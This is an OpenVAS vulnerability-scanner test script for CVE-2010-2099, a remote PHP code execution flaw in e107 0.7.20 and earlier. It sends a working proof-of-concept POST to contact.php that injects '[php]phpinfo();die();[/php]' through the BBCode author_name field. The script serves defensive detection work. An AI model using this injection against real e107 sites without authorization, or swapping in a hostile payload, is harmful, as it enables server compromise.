###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_e107_40252.nasl 14 2013-10-27 12:33:37Z jan $
#
# e107 BBCode Arbitrary PHP Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "e107 is prone to a remote PHP code-execution vulnerability.

An attacker can exploit this issue to inject and execute arbitrary
malicious PHP code in the context of the webserver process. This may
facilitate a compromise of the application and the underlying system;
other attacks are also possible.

e107 version 0.7.20 and prior are affected.";


if (description)
{
 script_id(100649);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-05-25 13:42:13 +0200 (Tue, 25 May 2010)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2010-2099");
 script_bugtraq_id(40252);

 script_name("e107 BBCode Arbitrary PHP Code Execution Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/40252");
 script_xref(name : "URL" , value : "http://e107.org/");
 script_xref(name : "URL" , value : "http://www.php-security.org/2010/05/19/mops-2010-035-e107-bbcode-remote-php-code-execution-vulnerability/index.html");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if e107 is prone to a remote PHP code-execution vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dir = "/e107";
if(!dir = get_dir_from_kb(port:port,app:"e107"))exit(0);

variables = string("send-contactus=1&author_name=[php]phpinfo()%3bdie()%3b[/php]");
filename = string(dir,"/contact.php");
host=get_host_name();

req = string(
      "POST ", filename, " HTTP/1.1\r\n", 
      "Referer: ","http://", host, filename, "\r\n",
      "Host: ", host, ":", port, "\r\n", 
      "Content-Type: application/x-www-form-urlencoded\r\n", 
      "Content-Length: ", strlen(variables), 
      "\r\n\r\n", 
      variables
);

result = http_send_recv(port:port, data:req, bodyonly:FALSE);
if(result == NULL )exit(0);

if(egrep(pattern: "<title>phpinfo\(\)</title>", string: result, icase: TRUE) || "php.net" >< result) {
  security_hole(port:port);
  exit(0);
}

exit(0);
